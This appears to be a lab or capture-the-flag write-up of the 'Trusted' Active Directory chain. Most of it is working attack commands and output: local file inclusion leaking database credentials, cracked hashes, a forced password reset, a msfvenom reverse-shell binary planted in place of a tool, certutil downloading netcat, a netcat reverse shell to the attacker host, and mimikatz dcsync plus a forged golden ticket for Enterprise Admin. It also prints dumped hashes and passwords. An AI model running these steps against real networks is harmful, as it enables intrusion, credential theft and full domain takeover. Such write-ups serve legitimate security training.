In the Trusted Active Directory chain involving the TRUSTED and LABDC hosts, enumeration of LABDC’s web server revealed a local file inclusion vulnerability that exposed database credentials; with root access to MySQL this produced two escalation paths. The intended path involved extracting and cracking user hashes to recover credentials (notably for rsmith), using those credentials to modify ewalters’s account and gain remote access, and subsequently escalating via a DLL hijacking vulnerability on cpower to obtain Domain Administrator privileges on LABDC. The alternative, unintended path consisted of writing a PHP web shell to the web directory to achieve SYSTEM-level execution. Finally, the child–parent domain trust between lab.trusted.vl and trusted.vl could be abused through a forged Kerberos ticket to assert Enterprise Domain Admin privileges.

## NMAP
```bash
sudo nmap -sC -sV -Pn  10.10.151.213 --open 
```

```output
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-26 13:40:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-26T13:40:57+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl
|   Product_Version: 10.0.20348
```

## 10.10.151.214

## NMAP

```bash
sudo nmap -sC -sV -Pn  10.10.151.214 --open 
```

## Output

```output
ORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| http-title: Welcome to XAMPP
|_Requested resource was http://10.10.151.214/dashboard/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-26 13:45:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome to XAMPP
|_Requested resource was https://10.10.151.214/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 9
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongColumnFlag, ConnectWithDatabase, ODBCClient, Speaks41ProtocolNew, FoundRows, IgnoreSigpipes, InteractiveClient, SupportsCompression, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: JQ8beW`_=Rf(3e&,IiUM
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-26T13:45:41+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-26T13:45:33+00:00
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
| Not valid before: 2025-09-25T13:37:10
|_Not valid after:  2026-03-27T13:37:10

```

## PORT 80/443 (HTTP/HTTPS)

```bash
curl -i http://10.10.151.214/dashboard/ 
```

```bash
HTTP/1.1 200 OK
Date: Fri, 26 Sep 2025 14:02:40 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
Last-Modified: Mon, 16 May 2022 10:59:15 GMT
ETag: "1d98-5df1eea3666c0"
Accept-Ranges: bytes
Content-Length: 7576
Content-Type: text/html
```

Fuzzing for files with wfuzz it showed `/dev`

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404,400,403,302  http://10.10.151.214/FUZZ   
```

```output
Target: http://10.10.151.214/FUZZ
Total requests: 62281

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000045:   301        9 L      30 W       336 Ch      "img"                                                                                                                       
000000127:   301        9 L      30 W       336 Ch      "dev"                                                                                                                       
000000519:   503        11 L     44 W       402 Ch      "examples"                                                                                                                  
000000912:   301        9 L      30 W       342 Ch      "dashboard"                                                                                                                 
000001618:   301        9 L      30 W       336 Ch      "IMG"                                                                                                                       
000001999:   301        9 L      30 W       336 Ch      "Img"                                                                                                                       
000002271:   301        9 L      30 W       336 Ch      "DEV"                                                                                                                       
000002565:   301        9 L      30 W       336 Ch      "Dev"                                                                                                                       
000003896:   301        9 L      30 W       338 Ch      "xampp"                                                                                                                     
000005516:   301        9 L      30 W       342 Ch      "Dashboard"                                                                                                                 
000006768:   301        9 L      30 W       342 Ch      "Webalizer"                                                                                                                 
000021544:   301        9 L      30 W       342 Ch      "WEBALIZER"

```

```bash
curl -i http://10.10.151.214/dev/  
```

```output
Date: Fri, 26 Sep 2025 14:10:02 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
X-Powered-By: PHP/8.1.6
Set-Cookie: PHPSESSID=k3gk77a2i4cvufj4b6si4phocd; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2311
Content-Type: text/html; charset=UTF-8

```

On visiting any of the pages, it’s going to take the html page name as a GET parameter `view`
![[Pasted image 20250926151246.png]]
So here we can try Local File Inclusion (LFI) to see if any of the local files get included

![[Pasted image 20250926151700.png]]
We can check the source of index.html file by using `php://filter` to encode the file contents in base64 as it might have php code which gets executed if it's in plain text
```bash
curl -i http://10.10.151.214/dev/index.html?view=php://filter/read=convert.base64-encode/resource=db.php
```

```output
PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4
```

now we need to decrypt it

```bash
echo "PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4" | base64 -d
```

```output
?php 
$servername = "localhost";
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";

$conn = mysqli_connect($servername, $username, $password);

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
?>                                

```

With these credentials we can login to mysql
```bash
 mysql -h 10.10.151.214 -u root -p --ssl=0
```

```output
Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]

```

```bash
ariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| news               |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
6 rows in set (0.051 sec)

MariaDB [(none)]> use news
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [news]> show tables;
+----------------+
| Tables_in_news |
+----------------+
| users          |
+----------------+
1 row in set (0.022 sec)

MariaDB [news]> show tablesss
    -> ^C
MariaDB [news]> show tables;
+----------------+
| Tables_in_news |
+----------------+
| users          |
+----------------+
1 row in set (0.020 sec)

MariaDB [news]> select * from users;
+----+------------+--------------+-----------+----------------------------------+
| id | first_name | short_handle | last_name | password                         |
+----+------------+--------------+-----------+----------------------------------+
|  1 | Robert     | rsmith       | Smith     | 7e7abb54bbef42f0fbfa3007b368def7 |
|  2 | Eric       | ewalters     | Walters   | d6e81aeb4df9325b502a02f11043e0ad |
|  3 | Christine  | cpowers      | Powers    | e3d3eb0f46fe5d75eed8d11d54045a60 |
+----+------------+--------------+-----------+----------------------------------+
3 rows in set (0.038 sec)

```

On trying to crack these hashes with Crack station
![[Pasted image 20250926154102.png]]
We can check if these credentials works on the target machine with `netexec`

```bash
netexec smb 10.10.151.214 -u rsmith -p 'IHateEric2'
```

```output
SMB         10.10.151.214   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False) 
SMB         10.10.151.214   445    LABDC            [+] lab.trusted.vl\rsmith:IHateEric2 
```
Checking the shares, there’s wasn’t any interesting share
```bash

netexec smb 10.10.151.214 -u rsmith -p 'IHateEric2' --shares
```

```output
SMB         10.10.151.214   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False) 
SMB         10.10.151.214   445    LABDC            [+] lab.trusted.vl\rsmith:IHateEric2 
SMB         10.10.151.214   445    LABDC            [*] Enumerated shares
SMB         10.10.151.214   445    LABDC            Share           Permissions     Remark
SMB         10.10.151.214   445    LABDC            -----           -----------     ------
SMB         10.10.151.214   445    LABDC            ADMIN$                          Remote Admin
SMB         10.10.151.214   445    LABDC            C$                              Default share
SMB         10.10.151.214   445    LABDC            IPC$            READ            Remote IPC
SMB         10.10.151.214   445    LABDC            NETLOGON        READ            Logon server share 
SMB         10.10.151.214   445    LABDC            SYSVOL          READ            Logon server share 
```

lets run bloodhound
```bash
$ netexec ldap 10.10.233.118 -u 'rsmith' -p 'IHateEric2' --bloodhound -c ALL
```

we receive a error 
```output
usr/lib/python3/dist-packages/dns/resolver.py:1363 in query                                                                                        │                  
                    │                                                                                                                                                     │                  
                    │   1360 │   │   │   DeprecationWarning,                                                                                                              │                  
                    │   1361 │   │   │   stacklevel=2,                                                                                                                    │                  
                    │   1362 │   │   )                                                                                                                                    │                  
                    │ ❱ 1363 │   │   return self.resolve(                                                                                                                 │                  
                    │   1364 │   │   │   qname,                                                                                                                           │                  
                    │   1365 │   │   │   rdtype,                                                                                                                          │                  
                    │   1366 │   │   │   rdclass,                                                                                                                         │                  
                    │                                                                                                                                                     │                  
                    │ /usr/lib/python3/dist-packages/dns/resolver.py:1317 in resolve                                                                                      │                  
                    │                                                                                                                                                     │                  
                    │   1314 │   │   │   assert request is not None  # needed for type checking                                                                           │                  
                    │   1315 │   │   │   done = False                                                                                                                     │                  
                    │   1316 │   │   │   while not done:                                                                                                                  │                  
                    │ ❱ 1317 │   │   │   │   (nameserver, tcp, backoff) = resolution.next_nameserver()                                                                    │                  
                    │   1318 │   │   │   │   if backoff:                                                                                                                  │                  
                    │   1319 │   │   │   │   │   time.sleep(backoff)                                                                                                      │                  
                    │   1320 │   │   │   │   timeout = self._compute_timeout(start, lifetime, resolution.errors)                                                          │                  
                    │                                                                                                                                                     │                  
                    │ /usr/lib/python3/dist-packages/dns/resolver.py:764 in next_nameserver                                                                               │                  
                    │                                                                                                                                                     │                  
                    │    761 │   │   if not self.current_nameservers:                                                                                                     │                  
                    │    762 │   │   │   if len(self.nameservers) == 0:                                                                                                   │                  
                    │    763 │   │   │   │   # Out of things to try!                                                                                                      │                  
                    │ ❱  764 │   │   │   │   raise NoNameservers(request=self.request, errors=self.errors)                                                                │                  
                    │    765 │   │   │   self.current_nameservers = self.nameservers[:]                                                                                   │                  
                    │    766 │   │   │   backoff = self.backoff                                                                                                           │                  
                    │    767 │   │   │   self.backoff = min(self.backoff * 2, 2)                                                                                          │                  
                    ╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯                  
                    NoNameservers: All nameservers failed to answer the query _ldap._tcp.gc._msdcs.lab.trusted.vl.communityfibre.co.uk. IN SRV: Server                                       
                    Do53:10.10.233.118@53 answered SERVFAIL                       

```

in order to sought this error we use 

```bash
sudo cp /etc/resolv.conf /etc/resolv.conf.backup
echo "nameserver 10.10.233.118" | sudo tee /etc/resolv.conf
```

now we again use it
```bash
netexec ldap 10.10.233.118 -u 'rsmith' -p 'IHateEric2' --bloodhound -c ALL  
```
output
```output
DAP        10.10.233.118   389    LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
LDAP        10.10.233.118   389    LABDC            [+] lab.trusted.vl\rsmith:IHateEric2 
LDAP        10.10.233.118   389    LABDC            Resolved collection methods: objectprops, acl, psremote, group, trusts, container, localadmin, rdp, dcom, session
[20:14:32] ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                domain.py:90
           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                domain.py:90
           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                domain.py:90
           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                domain.py:90
[20:14:33] ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                domain.py:90
[20:14:34] ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                domain.py:90
LDAP        10.10.233.118   389    LABDC            Done in 00M 06S
LDAP        10.10.233.118   389    LABDC            Compressing output into /home/kali/.nxc/logs/LABDC_10.10.233.118_2025-09-26_201430_bloodhound.zip
                                                           

```

we receive some warning but we get output so lets copy it same directory

```bash
cp /home/kali/.nxc/logs/LABDC_10.10.233.118_2025-09-26_201430_bloodhound.zip .
```

lets start neo4j and bloodhound and upload the data
```bash
sudo neo4j start
bloodhound
```


Running bloodhound-GUI and uplading the json files we got from python-bloodhound, we can see a path from `rsmith` to `ewalters` by having `ForceChangePassword` on ewalters, we can change the password and login by either WinRM or RDP since it has `CanPSRemote` permissions on the host

![[Pasted image 20250927013241.png]]

Through `rpcclient`, ewalters's password can be changed

```bash
rpcclient -U 'rsmith%IHateEric2' //10.10.233.118
```

now we can change the password of ewalters's
```bash
rpcclient $> setuserinfo2 ewalters 23 'Ewwalter@123456'
```

With netexec we can verify if the password is actually updated and we can login through WinRM

```bash
netexec winrm 10.10.233.118 -u 'ewalters' -p 'Ewwalter@123456'
```

output
```output
WINRM       10.10.233.118   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
WINRM       10.10.233.118   5985   LABDC            [+] lab.trusted.vl\ewalters:Ewwalter@123456 (Pwn3d!)
```

NOW lets use evil-WinRM and we get in
```bash
evil-winrm  -i 10.10.233.118 -u 'ewalters' -p 'Ewwalter@12345e'
```

Output
```output
*Evil-WinRM* PS C:\Users\ewalters\Documents> whoami
lab\ewalters
*Evil-WinRM* PS C:\Users\ewalters\Documents> 
```


so we  move to the AV Test folder
```
*Evil-WinRM* PS C:\AVTest> mv KasperskyRemovalTool.exe   KasperskyRemovalTool3.exe"

```

than we make our own meterperter shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.7.96 LPORT=5555 -f exe >  KasperskyRemovalTool.exe   
```
and we have to start msfconsole
```bash
msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.8.7.96; set LPORT 443; exploit"

```


we also run python server

```bash
python3 -m http.server 8001 
```


so we run it 

```bash
./KasperskyRemovalTool.exe
```

but the session keep dying
```shell
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.8.7.96:443 
[*] 10.10.216.246 - Meterpreter session 4 closed.  Reason: Died

```

in order to sort to this problem we have to migrate
```bash
run post/windows/manage/migrate
```
output
```bash
[*] Running module against LABDC
[*] Current server process: KasperskyRemovalTool.exe (4368)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1136
[+] Successfully migrated into process 1136
meterpreter > whoami


```


no run shell
```bash
shell
```

we get
```bash
eterpreter > shell
Process 4260 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
lab\cpowers

C:\Windows\system32>whoami/priv
whoami/priv


```


This user was a member of `domain admin` , so we have complete access on the first machine
```bash
C:\Users\cpowers>net user cpowers
net user cpowers
User name                    cpowers
Full Name                    Christine Powers
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/14/2022 6:57:50 PM
Password expires             Never
Password changeable          9/15/2022 6:57:50 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   9/27/2025 3:15:01 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Domain Admins        
The command completed successfully.



```
we get our first user flag
```bash
C:\Users\Administrator\Desktop>type user.txt
type user.txt
VL{349efd4b1ccbeb4d3ca0108fa5cc5802}
```


no we will ewalters to domain admins

```bash

net group "Domain Admins" ewalters /add /domain

```

```bash
Get-ADComputer -Identity "labdc"
```




```Output

### Trust Enumeration: Unraveling the AD Relationships

```bash
PS C:\Users\Administrator> Get-ADTrust -Filter *  
  
  
Direction : BiDirectional  
DisallowTransivity : False  
DistinguishedName : CN=trusted.vl,CN=System,DC=lab,DC=trusted,DC=vl  
ForestTransitive : False  
IntraForest : True  
IsTreeParent : False  
IsTreeRoot : False  
Name : trusted.vl  
ObjectClass : trustedDomain  
ObjectGUID : c8005918-3c50-4c33-bcaa-90c76f46561c  
SelectiveAuthentication : False  
SIDFilteringForestAware : False  
SIDFilteringQuarantined : False  
Source : DC=lab,DC=trusted,DC=vl  
Target : trusted.vl  
TGTDelegation : False  
TrustAttributes : 32  
TrustedPolicy :  
TrustingPolicy :  
TrustType : Uplevel  
UplevelOnly : False  
UsesAESKeys : False  
UsesRC4Encryption : False  
  
  
  
PS C:\Users\Administrator>

```

since ewalter has member of rdp group so we xfreerdp
```bash
xfreerdp /v:10.10.178.54 /u:ewalters /p:'Ewwalter@123456'

```

an d we are able to rdp to the machine

we run python server

```bash
python3 -m http.server 8001
```

we use certutil to send nc64.exe
```bash
certutil -urlcache -f http://10.8.7.96:8001/nc64.exe nc64.exe

```

and than exeute nc64.exe file

```bash

.\nc64.exe 10.8.7.96 4444 -e cmd.exe
```

we get reverse shell
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.7.96] from (UNKNOWN) [10.10.178.54] 53188
Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.


```

its time for mimikatz

```bash
.\mimi.exe
```

Following this [article](https://redteamtechniques.github.io/Windows%20%26%20AD%20Hacking/Lab%20Attacks/Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/), we can abuse this child->parent domain trust relationship and escalate to enterprise domain, in order to do this we need the krbtgt hash of lab.trusted.vl and the SIDs of both domains, then with mimikatz we can forge a golden ticket for the enterprise domain admin

```bash
lsadump::dcsync /domain:lab.trusted.vl /all
```

```output
Credentials:

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-2241985869-2159962460-1278545866-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ==c7a03c565c68c6fac5f8913fab576ebd==

Object RDN           : Domain Controllers

** SAM ACCOUNT **

SAM Username         : Domain Controllers
Object Security ID   : S-1-5-21-2241985869-2159962460-1278545866-516
Object Relative ID   : 516



```

Dumping ntds.dit to get the krbtgt hash by using `mimikatz`
```bash
lsadump::trust /patch

```

## OUTPUT
```output
mimikatz # lsadump::trust /patch

Current domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866)

Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591)
 [  In ] LAB.TRUSTED.VL -> TRUSTED.VL
    * 9/29/2025 6:13:01 AM - CLEAR   - 44 53 0d bd a5 26 ac b3 80 e1 0f 85 8b 2b d2 15 62 9c b8 25 63 46 1f 49 9a 99 71 8e 3c 87 2c e2 2e e7 66 52 c7 fc 66 77 c9 be a1 d0 64 5f b2 50 a7 75 35 f0 d6 a1 25 85 72 91 a4 c8 dc b3 55 1d b6 10 3e 24 10 4b 11 0d e6 7e 4c 2c fe b5 79 0a 37 43 14 d3 dd 5e 2c 6f 92 de 4c 3e 6a ec ea dc dc 85 34 c9 9b 59 f9 b7 03 4a d8 ef d6 92 1e f0 bd ca 8d f2 93 e4 60 bd 51 08 05 6d e3 2e cf a3 3c 3b 45 01 20 ef 18 17 4b 3b f3 64 c6 83 a7 ac 3f c2 10 53 44 27 57 d9 7d e5 a1 2c ac c6 98 c1 53 fc df 17 f4 93 9d 65 1b 89 6d 95 1a e3 93 9c 89 17 1d db e4 e5 f5 5b f4 6b 69 29 a3 ac 72 a9 94 b0 d0 e1 eb 5d f2 e7 b4 91 d7 36 e7 83 0b 94 e5 b7 aa 29 f4 53 b9 9b 33 b4 4a 83 25 75 3e de 8b 48 e1 d0 0f 3d ef fb 93 75 1e ea 16 be ab d3 
        * aes256_hmac       c04e56a3f6cd667828a2849e9f1a11121214a1b86b998ae119a1878aa20fe06a
        * aes128_hmac       af7b68e8eb0ee92cd4264bf236a821c4
        * rc4_hmac_nt       2759dae8b9b483a9081ea43cd3dd87c9



```


we will add 519 to our enterprise sid
## Common Enterprise Privilege RIDs:

|RID|Group|Scope|
|---|---|---|
|**519**|**Enterprise Admins**|**Entire Forest** 🌲|
|518|Schema Admins|Entire Forest|
|512|Domain Admins|Single Domain|
|520|Group Policy Creator Owners|Single Domain|




Now forging a ticket for enterprise domain admin
```bash
kerberos::golden /user:Administrator /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt

```

### OUTPUT

```output
ser      : Administrator
Domain    : lab.trusted.vl (LAB)
SID       : S-1-5-21-2241985869-2159962460-1278545866
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-3576695518-347000760-3731839591-519 ; 
ServiceKey: c7a03c565c68c6fac5f8913fab576ebd - rc4_hmac_nt      
Lifetime  : 9/29/2025 6:50:10 AM ; 9/27/2035 6:50:10 AM ; 9/27/2035 6:50:10 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ lab.trusted.vl' successfully submitted for current session



```

All that is left is to dump ntds from trusted.vl domain
```bash
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all

```

### OUTPUT
```output
SAM Username         : Domain Controllers
Object Security ID   : S-1-5-21-3576695518-347000760-3731839591-516
Object Relative ID   : 516

Credentials:

Object RDN           : DomainDnsZones


Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3576695518-347000760-3731839591-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 15db914be1e6a896e7692f608a9d72ef

Object RDN           : BCKUPKEY_0c265ae3-ef84-4900-9983-b1fbe71e738c Secret

  * Legacy key


```

Having the administrator’s hash from trusted.vl, we can login through WinRM and complete this AD chain.

```bash
evil-winrm  -i 10.10.178.53 -u 'administrator' -H'15db914be1e6a896e7692f608a9d72ef'
```
## OUTPUT
```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
At line:1 char:1

```

we change the password of administrator

```bash
 net user administrator "password123!"
```

Having the administrator’s password from trusted.vl, we can login through RDP and  get the flag

```bash
xfreerdp /v:10.10.178.54 /u:administrator /p:'password123!'   

```

we get the root shell



![[Pasted image 20250929080508.png]]






